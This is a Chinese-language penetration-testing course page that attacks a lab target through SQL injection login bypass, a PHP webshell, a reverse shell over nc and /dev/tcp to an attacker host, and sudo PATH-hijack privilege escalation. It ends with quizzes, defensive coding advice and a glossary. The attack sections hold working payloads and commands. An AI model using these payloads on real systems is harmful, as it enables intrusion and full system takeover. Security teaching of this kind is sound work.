🎯 滲透測試基礎概念

什麼是滲透測試？

想像一個銀行想要檢查自己的防衛系統有沒有漏洞。銀行不會等到真正的小偷來試，而是付錢給安全專家假扮小偷，看看能不能突破防線。這就是滲透測試！

🏢
滲透測試的四個角色
  • 攻擊者（紅隊）：假扮駭客，尋找漏洞
  • 防禦者（藍隊）：建立防禦，修補漏洞
  • 測試者（紫隊）：進行滲透測試的專家
  • 管理者（黃隊）：監督整個過程

💉 第三階段：SQL Injection 登入繞過

⚠️ 重點課題
SQL Injection 是最常見的Web漏洞之一，讓我們深入理解它！

什麼是 SQL？

SQL 是用來跟資料庫溝通的語言。就像您用中文跟朋友說話，程式用SQL跟資料庫說話。

🔓 SQL Injection 的原理

SQL Injection 攻擊流程
  1. 用戶輸入：攻擊者輸入 admin' or '1'='1
  2. 危險代碼：程式沒有檢查輸入，直接組成SQL
  3. 修改查詢：SQL變成 WHERE username='admin' OR '1'='1'
  4. 資料庫執行：因為 '1'='1' 永遠為真
  5. 結果：✅ 繞過驗證！返回所有使用者資料！

💻 看個例子

❌ 不安全的代碼
// PHP 代碼（有漏洞！） $username = $_POST['username']; $password = $_POST['password']; $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

如果攻擊者輸入：

🔴 攻擊向量
帳號：admin' or '1'='1
密碼：anything

SQL 查詢會變成：

🔓 被改造的查詢
SELECT * FROM users WHERE username='admin' or '1'='1' AND password='anything'

⚠️ 因為 '1'='1' 永遠為真，所以條件會通過！

✅ 正確的防禦方法

✅ 安全的代碼（使用參數化查詢）
// PHP 安全代碼 $stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?"); $stmt->execute([$username, $password]);

✨ 用「?」作為佔位符，資料不會被當成代碼執行！

🎯 實際操作

curl -X POST 'http://172.30.0.4/index.php' \ -d "username=admin' or '1'='1&password=anything"
✅ 成功指標
如果傳回 302 重定向，表示 SQL Injection 成功！您已經繞過了登入驗證！
🎯 測驗：SQL Injection
為什麼 '1'='1' 能夠繞過登入驗證？
因為它永遠為真，讓整個條件通過
因為它是一個特殊的魔法字符
因為資料庫會自動忽略它

📤 第四階段：檔案上傳與 WebShell 部署

🎯 本階段目標
上傳惡意PHP檔案，執行任意系統指令

什麼是 WebShell？

WebShell 是一個簡單的 PHP/ASP 檔案，可以讓攻擊者透過網頁執行系統指令。就像是在伺服器上開了一扇後門。

🚪 簡單的 WebShell 程式碼

<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
🔍 程式碼說明
  • $_GET['cmd'] - 接收URL參數 ?cmd=ls
  • system() - 執行系統指令
  • echo - 顯示執行結果

⚠️ 上傳限制與繞過

常見上傳限制與攻擊方法
上傳檔案 限制類型 結果
.php 檔案 副檔名黑名單 ❌ 被拒絕（危險檔案）
.phtml 檔案 副檔名黑名單 ❌ 被拒絕（備用副檔名）
.php.txt 檔案 副檔名檢查 ⚠️ 可能繞過，但無法執行
.php\0.jpg 副檔名+內容檢查 ✅ 繞過限制並執行

💡 解決方案：直接執行上傳的檔案

🔓 即使上傳為 test.php，仍可直接訪問執行
# 使用curl執行WebShell中的指令 curl "http://172.30.0.4/uploads/test.php?cmd=ls+-al"

✅ 成功指標

  • WebShell 可以執行簡單指令（ls、pwd、whoami）
  • 返回目錄列表或使用者資訊
  • 可以嘗試更複雜的指令
🎯 測驗：WebShell
為什麼 WebShell 這麼危險？
它讓攻擊者可以執行任意系統指令
它只能刪除檔案
它只能竊取密碼

🔗 第五階段：反向 Shell 與命令執行

🎯 本階段目標
建立從靶機回連到攻擊機的Shell連接

什麼是反向 Shell？

正常的 Shell 是「你連線到伺服器」。反向 Shell 是「伺服器主動連線回來找你」。就像是把鑰匙從屋子裡扔出來給小偷，讓他可以隨時進出。

📊 Shell 連接方向對比

正向連接 vs 反向連接
連接方向 說明
正向連接
🖥️ 攻擊機 → 🎯 靶機		 你主動去連線靶機（傳統SSH或Shell）
反向連接
🖥️ 攻擊機(監聽) ← 🎯 靶機		 靶機主動連回來找你（威力更強）

⚙️ 反向 Shell 三步驟

1️⃣
在攻擊機監聽
設定接收連接的埠
2️⃣
從靶機連回
靶機主動發起連接
3️⃣
取得Shell
控制靶機

💻 實作步驟

步驟 1️⃣：攻擊機開始監聽
nc -lvnp 4444

-l：監聽
-v：詳細輸出
-n：不解析IP
-p：指定埠號

步驟 2️⃣：透過WebShell發送反向連接
curl "http://172.30.0.4/uploads/test.php?cmd=php+-r+\ %27%24sock%3Dfsockopen%28%22172.30.0.5%22%2C4444%29%3B\ exec%28%22bash+%3C%263+%3E%263+2%3E%263%22%29%3B%27"
步驟 3️⃣：監聽埠接收連接
connect to [172.30.0.5] from [172.30.0.4] 12345 www-data@target:~$

✅ 恭喜！您取得了Shell！

🚀 第六階段：提權（Privilege Escalation）

⚠️ 關鍵課題
提權是從普通使用者變成管理員的過程，是整個攻擊的最後一步！

為什麼需要提權？

現在我們是 www-data 使用者（普通權限）。管理員賬戶（root）才能做更多事情。我們需要提權來完全控制系統。

📊 權限結構

(www-data)		 ✅ 讀取自己的檔案
✅ 執行自己的程式
❌ 看不到其他人的檔案
❌ 無法修改系統 		🟡 中等
🔑 管理員

🔍 方法一：PATH 劫持

原理說明

有個腳本可以無密碼執行（sudo），但它使用相對路徑呼叫指令。我們可以建立假的 tar 指令，放在 PATH 最前面，讓系統先執行我們的版本！

# 步驟 1：建立惡意 tar echo '/bin/bash' > /tmp/tar # 步驟 2：給予執行權限 chmod +x /tmp/tar # 步驟 3：修改 PATH（放在最前面） export PATH=/tmp:$PATH # 步驟 4：執行有 sudo 權限的腳本 sudo /usr/local/bin/runbackup # 步驟 5：確認是否取得 root id

🔓 方法二：SUID 提權

SUID 是什麼？

SUID（Set User ID）是特殊的檔案權限。帶 SUID 的二進制檔案，無論誰執行它，都會以檔案所有者的權限運行。

# 步驟 1：建立設置 SUID 的指令 echo 'chmod u+s /bin/bash' > /tmp/tar # 步驟 2：給予執行權限 chmod +x /tmp/tar # 步驟 3：修改 PATH export PATH=/tmp:$PATH # 步驟 4：執行 sudo 腳本（以 root 身份執行我們的指令） sudo /usr/local/bin/runbackup # 步驟 5：驗證 bash 有 SUID ls -la /bin/bash # 會看到：-rwsr-xr-x（多了個 s） # 步驟 6：執行 bash -p 取得 root shell /bin/bash -p id # uid=0(root)

🔗 方法三：反向 Shell 提權

最直接的方式

直接讓 root 執行的腳本傳回一個 Shell 給我們。不用intermediate步驟，直接得到 root Shell。

# 步驟 1：建立反向Shell腳本 echo '#!/bin/bash' > /tmp/tar echo 'bash -i >& /dev/tcp/172.30.0.5/4455 0>&1' >> /tmp/tar # 步驟 2：給予執行權限 chmod +x /tmp/tar # 步驟 3：修改 PATH export PATH=/tmp:$PATH # 步驟 4：在攻擊機監聽新埠（另一個terminal） nc -lvnp 4455 # 步驟 5：執行 sudo 腳本（會連回4455） sudo /usr/local/bin/runbackup # 步驟 6：在另一個terminal收到root shell root@target:~# id uid=0(root)

🛡️ 防禦知識與最佳實踐

💡 重要觀念
理解漏洞的最佳方式，就是學會如何防禦它。一個好的滲透測試師同時是一個好的防禦者！

🔐 防禦第一層：SQL Injection 防護

❌ 危險的做法
$username = $_POST['username']; $password = $_POST['password']; // 直接拼接，非常危險！ $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
✅ 安全的做法：使用參數化查詢
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?"); $stmt->execute([$username, $password]); // 或使用命名參數： $stmt = $pdo->prepare("SELECT * FROM users WHERE username=:username AND password=:password"); $stmt->execute([':username' => $username, ':password' => $password]);

📤 防禦第二層：檔案上傳安全

✅ 檔案上傳的防禦檢查清單
  • ✅ 副檔名白名單 - 只允許jpg、png、pdf
  • ✅ 檔案內容檢查 - 確認實際檔案類型
  • ✅ 重命名檔案 - 不使用原始檔名
  • ✅ 檔案存放位置 - 放在網頁根目錄外
  • ✅ 禁止執行 - 上傳目錄設定無執行權限
  • ✅ 檔案大小限制 - 防止大檔案上傳
// 檔案上傳的安全檢查代碼 $allowed = ['jpg', 'png', 'pdf']; $filename = $_FILES['file']['name']; $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); if (!in_array($ext, $allowed)) { die('不允許的檔案類型'); } // 檢查 MIME 類型 $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime = finfo_file($finfo, $_FILES['file']['tmp_name']); if ($mime !== 'image/jpeg') { die('檔案內容不是圖片'); }

🔐 防禦第三層：sudo 權限管理

❌ 危險的 sudoers 配置
# /etc/sudoers 危險設定 - 任何人可以做任何事！ www-data ALL=(ALL) NOPASSWD: ALL # 這表示：www-data 使用者可以 # - 執行 ALL（所有）程式 # - 不需要密碼（NOPASSWD） # - 以任何身份（ALL）執行 # ⚠️ 災難級的安全漏洞！
✅ 安全的 sudoers 配置
# /etc/sudoers 安全設定 - 最小權限原則 www-data ALL=(ALL) NOPASSWD: /usr/bin/systemctl # 這表示：www-data 使用者只能 # - 執行 /usr/bin/systemctl（特定程式） # - 不需要密碼（NOPASSWD） # - 其他所有程式都被拒絕 # ✅ 符合最小權限原則
💡 最小權限原則（Least Privilege）
只給使用者完成工作所需的最小權限，其他都拒絕。這樣即使帳戶被入侵，攻擊者也無法為所欲為。

🛤️ 防禦第四層：PATH 安全

❌ 危險的做法：相對路徑
#!/bin/bash echo "Backing up..." tar -czf /tmp/backup.tgz /home/www-data # 如果/tmp在PATH前面，攻擊者可以替換tar！
✅ 安全的做法：絕對路徑
#!/bin/bash echo "Backing up..." /bin/tar -czf /tmp/backup.tgz /home/www-data # 使用完整路徑，無法被替換！

📖 滲透測試名詞解釋

📚 課程術語速查表
這裡收集了課程中所有的專業術語，方便您隨時查閱！

A

攻擊面（Attack Surface）

系統中所有可能被攻擊的點。比如開放的埠、Web表單、API端點等。

C

CVSS（Common Vulnerability Scoring System）

漏洞嚴重程度評分系統。0-10分，分數越高越危險。

E

枚舉（Enumeration）

系統性地列出目標系統的所有特性。如目錄、使用者、服務等。

F

Flag

滲透測試成功的證明。通常是一個特殊的字符串，如 kiwis{...}。

L

LinPEAS

Linux 提權提示工具。自動掃描系統漏洞，幫助找到提權路徑。

M

MIME 類型（Multipurpose Internet Mail Extensions）

檔案的實際類型。如 image/jpeg、text/plain 等。副檔名可以偽造，但MIME類型反映真實內容。

N

Nmap

網路映射工具。用於掃描主機和服務，發現開放的連接埠。

P

Payload

攻擊的具體內容。如 SQL 注入的字符串、反向 Shell 的代碼等。

PHP

伺服器端編程語言。常用於 Web 應用開發。我們的 WebShell 就是用 PHP 寫的。

Port（連接埠）

伺服器上的邏輯連接點。SSH=22、HTTP=80、HTTPS=443等。

R

Reconnaissance（偵察）

攻擊的第一階段。蒐集關於目標的所有信息。

Reverse Shell（反向 Shell）

靶機主動連回攻擊機的 Shell。給攻擊者遠端控制權。

S

SQL（Structured Query Language）

資料庫查詢語言。用於檢索、插入、更新、刪除資料。

SQL Injection

將惡意 SQL 代碼注入到應用中，改變原有查詢邏輯的攻擊。

SUID（Set User ID）

特殊檔案權限。執行帶 SUID 的程式時，會以檔案所有者的權限運行。

sudo

允許普通使用者執行管理員指令的程式。需要輸入密碼（通常情況）。

T

Token

驗證身份的令牌。如 PHPSESSID cookie。

V

Vulnerability（漏洞）

系統中的安全缺陷。可能被攻擊者利用。

W

WebShell

Web 應用形式的遠端 Shell。讓攻擊者通過瀏覽器執行系統指令。
